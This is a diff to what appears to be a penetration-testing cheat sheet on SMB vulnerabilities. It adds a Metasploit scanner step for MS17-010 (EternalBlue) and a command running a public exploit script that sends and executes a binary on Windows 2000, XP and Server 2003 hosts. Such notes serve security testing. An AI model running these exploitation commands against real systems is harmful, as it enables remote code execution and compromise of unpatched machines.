@@ -309,7 +309,14 @@ to detect if a SMBv1 server is vulnerable to the remote code execution
 vulnerability MS17-010, a.k.a. EternalBlue (vulnerability exploited by WannaCry
 and Petya ransomware) or CVE-2017-7494 aka SambaCry.
 
+The Metasploit `auxiliary/scanner/smb/smb_ms17_010` module can be used as well
+(supports host(s), range CIDR identifier, or hosts file).
+
 ```
+msf> use auxiliary/scanner/smb/smb_ms17_010
+# set RHOSTS file:<PATH>
+# set THREADS <THREADS_NUMBER>
+
 # EternalBlue
 nmap --script smb-vuln-ms17-010.nse -p 445 <HOSTNAME | IP | CIDR>
 
@@ -339,6 +346,10 @@ vulnerability on Windows hosts:
 ```
 # Windows 7 and Server 2008 R2 (x64) All Service Packs
 msf> use exploit/windows/smb/ms17_010_eternalblue
+
+# Windows NT 5.0 / 5.1 / 5.2 (Windows 2000 / Windows XP & Windows Server 2003)
+# https://github.com/helviojunior/MS17-010
+python send_and_execute.py <HOSTNAME | IP> <BINARY>
 ```
 
 *SambaCry*
